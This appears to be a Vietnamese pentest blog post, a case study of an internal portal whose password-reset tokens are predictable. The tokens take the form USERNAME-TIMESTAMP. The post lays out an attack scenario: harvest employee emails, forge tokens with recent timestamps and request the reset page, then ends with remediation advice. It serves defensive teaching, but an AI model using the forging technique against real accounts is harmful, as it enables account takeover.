---
title: "Bypass reset password bằng token dự đoán được"
date: 2026-01-28T20:10:00+07:00
draft: false
description: "Case study auth bypass trên chức năng quên mật khẩu do sinh token yếu và thiếu kiểm soát."
featuredImage: "/img/featured.svg"

categories: ["Pentest", "Web Application"]
tags: ["authentication", "reset-password", "token-prediction", "logic-bug"]

showTableOfContents: true
showAuthor: true
showDate: true
showReadingTime: true
---

## 1. Mô tả hệ thống

Ứng dụng là một portal nội bộ cho nhân viên, dùng email công ty để login.  
Chức năng **Forgot Password** gửi link reset qua email.

Điểm yếu: token reset được sinh ra **không đủ entropy** và có dạng dễ đoán.

## 2. Phân tích request reset password

Request:

```http
POST /auth/forgot HTTP/1.1
Content-Type: application/json

{"email": "user1@corp.local"}
```

Email nhận được:

```text
https://portal.corp.local/auth/reset?token=USER1-1674883200
```

Token có format:

```text
<USERNAME-UPPER>-<UNIX_TIMESTAMP>
```

Không có chữ random, không có HMAC/Signature.

## 3. Xây dựng payload tấn công

Vì format token đơn giản, attacker có thể **forge token** cho bất kỳ user nào nếu:

- Biết username (thường là trước @ trong email).
- Đoán được khoảng thời gian token còn hiệu lực (ví dụ 10–15 phút).

Kịch bản:

1. Lấy list email từ tính năng “invite user” hoặc từ OSINT.
2. Với mỗi email `alice@corp.local`, sinh token:

```text
ALICE-<timestamp_gần_hiện_tại>
```

3. Gửi request:

```http
GET /auth/reset?token=ALICE-1674883500 HTTP/1.1
Host: portal.corp.local
```

4. Nếu server chỉ kiểm tra `"ALICE"` tồn tại và `timestamp` chưa hết hạn → **bypass hoàn toàn email**.

## 4. Khuyến nghị kỹ thuật

- Token reset phải:
  - Có **entropy cao** (ít nhất 128 bit random).
  - Kèm theo **signature** (HMAC) hoặc dùng framework-secure token có sẵn.
- Token nên **one-time use** và **gắn chặt với IP / User Agent** nếu có thể.
- Tuyệt đối không encode thông tin nhạy cảm trực tiếp vào token theo kiểu dễ đoán.

## 5. Lesson learned

Auth không chỉ là “login đúng mật khẩu” mà còn là:

- Toàn bộ **flow liên quan**: đăng ký, quên mật khẩu, thay đổi email, 2FA, v.v.
- Mỗi flow nếu thiết kế cẩu thả đều trở thành **điểm gãy bảo mật**.

Khi review ứng dụng, luôn dành thời gian **đi hết các flow auth** chứ không chỉ fuzz endpoint chính.

